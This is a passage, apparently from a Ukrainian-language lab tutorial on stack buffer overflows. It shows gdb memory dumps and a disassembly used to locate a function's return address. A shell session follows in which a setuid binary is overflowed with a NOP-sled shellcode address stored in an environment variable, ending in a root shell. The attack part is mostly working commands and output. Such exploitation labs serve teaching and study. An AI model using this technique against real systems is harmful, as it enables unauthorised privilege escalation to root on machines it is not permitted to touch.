+0xbfffeea8:     0x00000006      0x00000002      0x00000001      0x3f91eb85
+0xbfffeeb8:     0x41414141      0x41414141      0xbfffee00      0x080483ea
+0xbfffeec8:     0xbfffeed4      0xbffffcc7      0x00000003      0x44434241
+0xbfffeed8:     0x000a4645      0x08048406      0x42130a14      0x00000003
+0xbfffeee8:     0xbfffef08      0x42015574      0x00000002      0xbfffef34
+0xbfffeef8:     0xbfffef40      0x4001582c      0x00000002      0x080482ac
+0xbfffef08:     0x00000000      0x080482cd      0x080483ab      0x00000002
+0xbfffef18:     0xbfffef34      0x080483fc      0x0804842c      0x4000c660
+(gdb) x/dw &a
+0xbfffeeb0:     1
+(gdb) x/dw &b
+0xbfffeeac:     2
+(gdb) x/dw &c
+0xbfffeea8:     6
+(gdb) x/dw &d 
+0xbfffeed0:     3
+(gdb) x/fw &ff
+0xbfffeeb4:     1.13999999
+(gdb) x/xw &ff
+0xbfffeeb4:     0x3f91eb85
+(gdb) x/s somestring
+0xbffffcc7:      "AAAAAAAA"
+(gdb) x/4xw somestring
+0xbffffcc7:     0x41414141      0x41414141      0x534f4800      0x4d414e54
+(gdb) x/s str2
+0xbfffeed4:      "ABCDEF\n"
+(gdb) x/4xw str2
+0xbfffeed4:     0x44434241      0x000a4645      0x08048406      0x42130a14
+(gdb) x/s str1
+0xbfffeeb8:      "AAAAAAAA"
+(gdb) x/4xw str1
+0xbfffeeb8:     0x41414141      0x41414141      0xbfffee00      0x080483ea
+(gdb) 
+
+Тепер можемо відновити розташування даних в стеку:
+0xbfffeea8:       <c>           <b>             <a>             <ff>
+0xbfffeeb8:      <str1>        <str1>        0xbfffee00     ●0x080483ea●
+0xbfffeec8:      <&str2>    <&somestring>       <d>            <str2>
+0xbfffeed8:      <str2>        <str2>          <str2>        0x00000003
+*<SFP> - Saved Frame Pointer – збережене значення EBP попереднього кадру стека.
+
+Щоб дізнатися адресу повернення з процедури exploitable, дізассемблюємо частину програми.
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483ab <main+0>:    push   %ebp
+0x080483ac <main+1>:    mov    %esp,%ebp
+0x080483ae <main+3>:    sub    $0x14,%esp
+0x080483b1 <main+6>:    movl   $0x3,0xfffffffc(%ebp)
+0x080483b8 <main+13>:   push   $0x80484e7
+0x080483bd <main+18>:   lea    0xffffffec(%ebp),%eax
+0x080483c0 <main+21>:   push   %eax
+0x080483c1 <main+22>:   call   0x804829c <strcpy>
+0x080483c6 <main+27>:   add    $0x8,%esp
+0x080483c9 <main+30>:   push   $0x80484ef
+0x080483ce <main+35>:   call   0x804828c <printf>
+0x080483d3 <main+40>:   add    $0x4,%esp
+0x080483d6 <main+43>:   pushl  0xfffffffc(%ebp)
+0x080483d9 <main+46>:   mov    0xc(%ebp),%eax
+0x080483dc <main+49>:   add    $0x4,%eax
+0x080483df <main+52>:   pushl  (%eax)
+0x080483e1 <main+54>:   lea    0xffffffec(%ebp),%eax
+0x080483e4 <main+57>:   push   %eax
+●0x080483e5 <main+58>:   call   0x804835c <exploitable>
+●0x080483ea <main+63>:   add    $0xc,%esp
+0x080483ed <main+66>:   push   $0x80484ff
+0x080483f2 <main+71>:   call   0x804828c <printf>
+---Type <return> to continue, or q <return> to quit---
+0x080483f7 <main+76>:   add    $0x4,%esp
+0x080483fa <main+79>:   leave  
+0x080483fb <main+80>:   ret    
+End of assembler dump.
+(gdb) 
+
+Адресою повернення із exploitable буде адреса наступної строки після виклика
+call 0x804835c <exploitable> тобто 0x080483ea. Ця адреса збігається зі значенням в стеці за 
+адресою 0xbfffeec4.
+
+Таким чином, адреса повернення займає четверте чотирьохбайтне слово відносно початку рядка str1.
+
+
+2.4 Тепер повторимо з даною програмою дії, аналогічні п. 1.6-1.9.
+[root@localhost hack]# cp overflow_1_14 /home/user1
+[root@localhost hack]# cp shellcode.bin /home/user1
+cp: overwrite `/home/user1/shellcode.bin'? yes
+[root@localhost hack]# cp getenv_example /home/user1                       
+cp: overwrite `/home/user1/getenv_example'? yes
+[root@localhost hack]# cd /home/user1
+[root@localhost user1]# chmod 4755 overflow_1_14
+[root@localhost user1]# chmod o+x getenv_example
+[root@localhost user1]# su user1
+unknown terminal "xterm-256color"
+unknown terminal "xterm-256color"
+[user1@localhost user1]$ id
+uid=500(user1) gid=500(user1) groups=500(user1)
+[user1@localhost user1]$ env | grep LANG
+LANG=en_US.UTF-8
+[user1@localhost user1]$ export LANG=C
+[user1@localhost user1]$ env | grep LANG
+LANG=C
+[user1@localhost user1]$ env | grep SHELLCODE
+SHELLCODE=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��j
+                                                                                                                                                                                                   XQh//shh/bin��Q��S��                                                                                                                                                                                                                           
+[user1@localhost user1]$ export SHELLCODE=$(perl -e 'print "\x90"x200' )$(cat shellcode.bin)
+[user1@localhost user1]$ env | grep SHELLCODE
+SHELLCODE=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��j
+                                                                                                                                                                                                   XQh//shh/bin��Q��S��
+[user1@localhost user1]$ ./getenv_example SHELLCODE
+SHELLCODE is at 0xbffffcf1
+*Отримана від getenv_example адреса підставляється в строку експлойта в зворотному
+порядку байт.
+
+[user1@localhost user1]$ ./overflow_1_14 $(perl -e 'print "\xf1\xfc\xff\xbf"x2')
+..Some stuff..
+Voila: str1=�������� bla-bla-bla 6 str2=ABCDEF
+ ..and more stuff..
+Segmentation fault
+[user1@localhost user1]$ ./overflow_1_14 $(perl -e 'print "\xf1\xfc\xff\xbf"x3')
+..Some stuff..
+Voila: str1=������������ bla-bla-bla 6 str2=ABCDEF
+Segmentation fault
+[user1@localhost user1]$ ./overflow_1_14 $(perl -e 'print "\xf1\xfc\xff\xbf"x4')
+..Some stuff..
+sh-2.05b# id
+uid=0(root) gid=500(user1) groups=500(user1)
+sh-2.05b# 
